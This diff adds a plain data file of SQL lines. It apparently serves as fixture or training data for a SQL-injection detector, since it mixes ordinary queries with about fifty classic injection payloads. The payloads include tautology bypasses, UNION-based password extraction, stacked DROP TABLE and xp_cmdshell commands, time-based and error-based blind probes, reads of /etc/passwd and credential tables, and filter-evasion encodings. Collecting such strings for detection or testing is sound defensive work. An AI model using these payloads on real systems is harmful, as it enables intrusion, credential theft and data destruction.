@@ -1,0 +1,72 @@
+SELECT * FROM products WHERE price > 100;
+SELECT id, name FROM users WHERE status = 'active';
+INSERT INTO logs (message) VALUES ('System backup started');
+UPDATE settings SET value = 'off' WHERE key = 'maintenance';
+DELETE FROM sessions WHERE last_activity < NOW() - INTERVAL 1 DAY;
+SELECT count(*) FROM orders;
+SELECT * FROM blog WHERE content LIKE '%SQL%';
+INSERT INTO feedback (comment) VALUES ('How to use SELECT?');
+SELECT * FROM employees WHERE department = 'IT';
+UPDATE inventory SET stock = 50 WHERE sku = 'ABC-123';
+SELECT * FROM users WHERE username = 'guest';
+INSERT INTO tickets (subject) VALUES ('Login error');
+SELECT (100 + 50) AS total;
+SELECT * FROM items WHERE code = 'UNION-99';
+DELETE FROM temp_files WHERE created_at < NOW();
+SELECT "SELECT * FROM users" AS query_string;
+SELECT * FROM (SELECT id FROM customers) AS c;
+SELECT * FROM search WHERE term LIKE '%admin%';
+INSERT INTO banned_ips (ip) VALUES ('10.0.0.1');
+SELECT length(bio) FROM profiles;
+SELECT * FROM json_data WHERE info->>'$.role' = 'user';
+SELECT * FROM users WHERE id = 1 OR 1=1;
+' OR '1'='1
+admin' --
+" OR "1"="1
+' UNION SELECT null, username, password FROM users --
+1; DROP TABLE customers; --
+' AND 1=1
+' AND 1=0
+1' ORDER BY 1 --
+1' ORDER BY 9999 --
+admin' #
+' OR 'a'='a
+1' AND (SELECT count(*) FROM information_schema.tables) > 0 --
+1 UNION SELECT 1, version(), 3 --
+' OR 1=1#
+admin'/*
+' OR '1'='1' --
+1' WAITFOR DELAY '0:0:05' --
+1; EXEC xp_cmdshell('net user')
+' HAVING 1=1 --
+1' AND SLEEP(10) --
+-1 UNION SELECT 1, schema_name, 3 FROM information_schema.schemata
+SeLeCt * FrOm users WhErE id = 1
+UN/**/ION SE/**/LECT 1,2,3
+S%E%L%E%C%T * FROM users
+SELECT * FROM information_schema.tables
+SELECT table_name FROM information_schema.columns
+SELECT * FROM mysql.user
+SELECT * FROM pg_shadow
+SELECT * FROM master..syslogins
+1' AND ExtractValue(1, CONCAT(0x5c, (SELECT database()))) --
+-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables
+1' AND 1=1 AND '%'='
+(SELECT 1 FROM (SELECT SLEEP(5))A)
+1' OR '1'='1' /*
+UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
+-1' UNION SELECT 1, @@version, 3 --+
+1 OR 1=1 LIMIT 1
+1" OR "1"="1
+1' || (SELECT 'hax') || '1
+SELECT * FROM users WHERE id=1 AND 1=(SELECT COUNT(*) FROM tabname); --
+1' AND 1=2 UNION SELECT 1, 'admin', 'hash_value' --
+/*!50000 SELECT * FROM users */
+%27%20OR%201=1
+admin') OR ('1'='1
+1' ORDER BY (CASE WHEN (1=1) THEN 1 ELSE 0 END) --
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+id=1' AND 1=0 UNION ALL SELECT 1,2,3,4,5,6 --
+' OR '1' IN ('1', '2') --
+admin' -- -
